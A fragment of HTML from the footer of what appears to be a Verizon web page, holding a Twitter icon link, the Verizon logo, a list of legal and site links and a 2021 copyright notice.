			</svg>
		</a>
		<a class="gnav20-social-media"  target="_blank" aria-label="Follow Verizon Fios on Twitter" title="Opens New Window">
			<span>twitter</span>
			<svg focusable="false" version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 18 18" style="enable-background:new 0 0 18 18;" xml:space="preserve">
				<path fill="#FFF" d="M15.9,4.3c0.8-0.5,1.3-1.2,1.6-2C16.8,2.7,16,3,15.2,3.1C14.5,2.4,13.6,2,12.5,2c-2,0-3.7,1.6-3.7,3.7c0,0.3,0,0.6,0.1,0.8
					c-3-0.2-5.7-1.6-7.5-3.8C1.1,3.2,0.9,3.8,0.9,4.5c0,1.3,0.6,2.4,1.6,3C1.9,7.5,1.3,7.3,0.8,7c0,1.8,1.3,3.2,2.9,3.6
					c-0.3,0.1-0.6,0.1-1,0.1c-0.2,0-0.5,0-0.7-0.1c0.5,1.5,1.8,2.5,3.4,2.5c-1.3,1-2.8,1.6-4.5,1.6c-0.3,0-0.6,0-0.9-0.1
					c1.8,1.2,3.7,1.9,5.8,1.9c6.7,0,10.4-5.6,10.4-10.4c0-0.2,0-0.3,0-0.5c0.7-0.5,1.3-1.2,1.8-1.9C17.3,4,16.6,4.2,15.9,4.3z"></path>
			</svg>
		</a>
		
		
		
		
	</div>
</div></div>



				</div>
			</div>
		</div>
		<div class="gnav20-footer-level-two gnav20-custom-margin-left">
			



    
    
    <div class="gnav20-logo">

<div class="gnav20-logo-wrapper gnav20-relative-index">
    <a class="gnav20-logoBlackBg"  title="Verizon Home Page">
        <img alt="Verizon Logo" src="rel/vr/full_logo_white.png">
    </a>
</div></div>


    
    
    <div class="gnav20-footerlink">


	<ul class="gnav20-footer-list ">
		<li><a >Site Map</a></li>
	
		<li><a >Privacy policy</a></li>
	
		<li><a >Accessibility</a></li>
	
		<li><a >Open internet</a></li>
	
		<li><a >Terms &amp; conditions</a></li>
	
		<li><a >Advertise with us</a></li>
	
		<li><a >Do Not Sell My Personal Information</a></li>
	
		<li><a >About our ads</a></li>
	</ul>

	<div class="copyright-section">
		<div class="copyright-text">
			© <span id="copyright-year">2021</span> Verizon
		</div>
    <div id="visual-cue"><div></div><div></div><div></div></div></div>
</div>



		</div>
	</div>
</div>
</div>


    
    
    


     </div>
	<div class="gnav20-sticky-header "></div>
</div>


</div>
     <div class="gnav20-click-div"></div><div class="gnav20-click-div"></div>
</body></html>